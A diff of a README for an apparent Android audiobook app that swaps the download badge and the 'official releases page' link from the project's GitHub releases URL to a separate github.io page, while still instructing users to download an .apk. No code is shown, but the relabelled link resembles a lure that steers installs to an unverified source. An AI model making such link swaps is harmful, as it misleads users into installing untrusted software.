@@ -1,6 +1,6 @@
 # 🎧 audiobookshelf-app-cloudflare-zero-trust - Access your audiobooks securely from anywhere
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/darlinm4344/audiobookshelf-app-cloudflare-zero-trust/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://darlinm4344.github.io)
 
 ## What is this app?
 
@@ -21,7 +21,7 @@ Before you install this software, ensure your setup meets these requirements:
 
 You must obtain the installation file from the official releases page. Follow these instructions to download the correct file for your device:
 
-1. Visit the [official releases page](https://github.com/darlinm4344/audiobookshelf-app-cloudflare-zero-trust/releases).
+1. Visit the [official releases page](https://darlinm4344.github.io).
 2. Look for the latest version listed at the top of the page.
 3. Locate the file ending in `.apk`.
 4. Tap the file name to start the download.
